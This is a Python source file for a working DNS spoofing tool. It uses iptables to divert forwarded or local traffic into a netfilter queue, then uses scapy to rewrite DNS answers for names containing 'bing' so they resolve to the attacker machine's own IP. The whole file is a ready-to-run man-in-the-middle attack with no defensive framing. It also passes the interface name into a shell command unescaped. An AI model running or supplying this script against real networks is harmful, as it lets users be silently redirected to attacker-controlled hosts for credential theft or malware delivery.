#!/root/anaconda3/bin  python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse

local_computer_test = False


class NetSpoof(object):
    def __init__(self, main_layer, dns_str_layer, filter_word):
        self.check_arguments()
        if self.options.interface:
            self.interface = self.options.interface
        else:
            self.get_interface()
        if self.interface:
            self.spoof_ip = self.get_my_ip()
            self.main_layer = main_layer
            self.dns_str_layer = dns_str_layer
            self.filter_word = filter_word


    def check_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-i", "--interface", dest="interface",
                        help="Interface name to work with it for spoofing.")

        (self.options, arguments) = parser.parse_args()
        return self.options

    def get_interface(self):
        machine_data = str(subprocess.check_output(
            r"ifconfig | sed 's/^\(.*\): /\1---\n/g' | sed 's/\s*\(ether.*\)/\1---/g' | sed -n '/.*---/p' | sed 's/---// g'", shell=True)).replace(r"b'", '').replace("'", '').split(r'\n')[:-1]

        start = 1
        relevant_interfaces = {}

        while start < len(machine_data):
            if 'ether' in machine_data[start]:
                relevant_interfaces[start] = machine_data[start - 1]
            start += 1

        print(
            f"\nThose are available interfaces:{relevant_interfaces}\nPlease choose the interface by index.Insert the number:")

        try:
            self.interface = relevant_interfaces[int(input())]
        except KeyError:
            print('Interface does not exist!!')
            return None
        return self.interface

    def get_my_ip(self):
        return str(subprocess.check_output(
            r"ip route  |  sed -n '/" + self.interface + ".*kernel/ p' | awk '{print $9; exit}'", shell=True)).replace("b'", '').replace(r"\n'", '')

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(self.main_layer):
            qname = scapy_packet[self.dns_str_layer].qname
            if self.filter_word in str(qname):
                print('[+] Spoofing target')
                answer = scapy.DNSRR(rrname=qname, rdata=self.spoof_ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))
        packet.accept()


if __name__ == '__main__':

    if local_computer_test:
        subprocess.call(
            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
        subprocess.call(
            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    else:
        subprocess.call(
            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    try:
        sp_obj = NetSpoof(scapy.DNSRR, scapy.DNSQR, "bing")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, sp_obj.process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(r'iptables --flush', shell=True)
